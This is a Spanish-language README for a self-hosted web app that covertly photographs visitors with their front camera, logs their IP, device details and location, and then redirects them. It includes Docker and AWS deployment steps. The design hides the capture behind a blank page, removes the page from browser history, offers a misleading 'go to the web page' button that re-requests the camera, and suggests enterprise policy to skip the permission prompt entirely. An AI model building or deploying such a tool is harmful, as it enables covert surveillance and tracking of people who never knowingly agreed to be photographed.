# Redirect Capture

Página intermedia que captura una foto de la cámara frontal del visitante y lo redirige
a una web configurada por el administrador. El administrador puede ver las capturas
con sus metadatos y cambiar la URL de destino desde un panel.

## Requisitos

- Node.js 18 o superior

## Instalación

```bash
npm install
cp .env.example .env
```

Edita `.env` y cambia `ADMIN_PASS` y `SESSION_SECRET` (obligatorio). El usuario y
contraseña del admin se crean en la base de datos al primer arranque.

## Uso

### Sin Docker

```bash
npm start
```

### Con Docker (docker compose)

```bash
cp .env.example .env   # cambia ADMIN_PASS y SESSION_SECRET
docker compose up -d --build
```

- **Local (recomendado para pruebas)**: se levanta solo la app en
  `http://localhost:3000`. No necesita Caddy ni certificados: `localhost` es un
  contexto seguro por sí mismo, así que la cámara funciona directamente (sin avisos
  de certificado).
- **Producción (EC2)**: agrega Caddy con HTTPS automático (Let's Encrypt):

```bash
docker compose --profile production up -d --build
```

- La base de datos y las fotos se guardan en el volumen `app-data` (sobreviven a
  recreaciones del contenedor).
- Para ver los logs: `docker compose logs -f`
- Para detener: `docker compose down` (la data persiste; usa `docker compose down -v`
  si quieres borrarla).

- Página de captura: `http://localhost:3000/r/<token>` (el token se muestra y se puede
  cambiar desde el panel admin).
- Panel admin: `http://localhost:3000/admin`

Flujo del visitante:

1. Abre el enlace `.../r/<token>`: ve una página en blanco.
2. El script intenta capturar la cámara frontal automáticamente.
   - **Primera visita** en un navegador: el navegador muestra su popup de permiso de
     cámara (es obligatorio por diseño del navegador; no hay forma válida de evitarlo).
     Es el único aviso visible: no hay advertencias de certificado con HTTPS válido.
   - **Visitas siguientes** en el mismo navegador: el permiso ya está concedido, la
     foto se toma en silencio y redirige en menos de un segundo, sin popups.
   - Si el usuario niega o cierra el popup, aparece el botón «Presiona aquí para ir a
     la web page» que lo vuelve a intentar.
3. La redirección usa `window.location.replace()`, así la página intermedia no queda en
   el historial ni en el botón «atrás» del navegador.
4. Los metadatos siempre se registran; la foto solo si se obtuvo el permiso.

## Panel de administración

- **Redirección**: cambiar la URL de destino y el token del enlace de entrada.
- **Capturas**: galería con la foto, IP, referrer, user-agent, idioma, zona horaria,
  geolocalización (solo si el usuario ya la tenía concedida) y fecha.

## Base de datos

`capturas.db` (SQLite) con tablas:

- `settings` — `destination_url` y `entry_token`
- `captures` — foto, IP, user-agent, referrer, ubicación, fecha
- `admins` — usuario y hash de contraseña

Las imágenes se guardan en `uploads/`.

## Importante: HTTPS

`navigator.mediaDevices.getUserMedia` solo funciona en contexto seguro. En producción
debes usar **HTTPS** (p. ej. con un proxy reverso como nginx/Caddy y certificado
Let's Encrypt, o Cloudflare Tunnel). `localhost` funciona para pruebas locales.

## Despliegue en AWS EC2

### 1. Crear la instancia (consola AWS)

- Servicio **EC2 → Launch instance**, free tier: `t2.micro`, **Ubuntu 24.04**.
- Security group: abrir solo los puertos **22 (SSH)**, **80 (HTTP)** y **443 (HTTPS)**.
- Crear y guardar el **key pair** (archivo `.pem`). Asegurar permisos:
  `chmod 400 tu-key.pem`
- Anotar la IP pública. Recomendado: **Elastic IP** (EC2 → Elastic IPs → Allocate)
  para que no cambie al reiniciar.

### 2. Apuntar el dominio

En tu registrador (Route53 u otro), crea un registro **A**:
`tu-dominio.com → <IP elástica de la instancia>`

### 3. Instalar Docker en la instancia

```bash
ssh -i tu-key.pem ubuntu@<IP>
sudo apt-get update && sudo apt-get install -y docker.io docker-compose-v2
sudo usermod -aG docker $USER
```

Cierra sesión y vuelve a entrar (para que el grupo `docker` surta efecto).

### 4. Subir el proyecto

Desde tu Mac:

```bash
scp -i tu-key.pem -r /ruta/al/proyecto ubuntu@<IP>:~/app
```

En la instancia, editar el `.env` con credenciales reales:

```bash
cd ~/app && cp .env.example .env && nano .env
# ADMIN_PASS y SESSION_SECRET obligatorios
```

### 5. Levantar la aplicación (app + Caddy)

```bash
cd ~/app
docker compose --profile production up -d --build
```

Caddy se levanta junto con la app: expone **80/443** públicamente y hace proxy
reverso hacia la app por la red interna (`app:3000`, puerto nunca expuesto).
Edita antes `Caddyfile` reemplazando `tu-dominio.com` por tu dominio real. Caddy
obtiene el certificado Let's Encrypt automáticamente (primera carga puede tardar
~1 minuto).

### 6. Verificar

- `https://tu-dominio.com/r/<token>` → página de captura (la cámara funciona porque hay HTTPS).
- `https://tu-dominio.com/admin` → panel admin (el enlace de captura completo se muestra y se copia con un clic).
- `docker compose logs -f` → logs de la app y de Caddy.

### Actualizaciones

```bash
cd ~/app && git pull && docker compose --profile production up -d --build
```

## El popup de la cámara

Todo navegador exige que el usuario acepte el permiso de cámara **una sola vez por
sitio/origen**; no existe ninguna forma válida de evitarlo (es una barrera de
seguridad del navegador, no de esta app).

- En la primera visita aparece el popup del navegador al cargar la página (el intento
  de captura es automático, sin clics previos). Tras aceptarlo, las visitas siguientes
  en el mismo navegador son 100 % automáticas: captura en silencio y redirección.
- Si el usuario niega o cierra el popup, aparece el botón «Presiona aquí para ir a la
  web page» que vuelve a intentarlo; si vuelve a negar, igual se registran metadatos
  y se redirige.
- Con dispositivos corporativos gestionados (Chrome/Edge Enterprise) el administrador
  puede pre-conceder la cámara por política, logrando que ni siquiera la primera
  visita muestre el popup.

## Nota legal

La foto se toma únicamente con el consentimiento del visitante a través del prompt de
permiso de cámara del navegador. Verifica que tu uso cumpla con las leyes de privacidad
aplicables (p. ej. GDPR, Ley 19.628 en Chile) y que la captura sea proporcional y
transparente cuando corresponda.
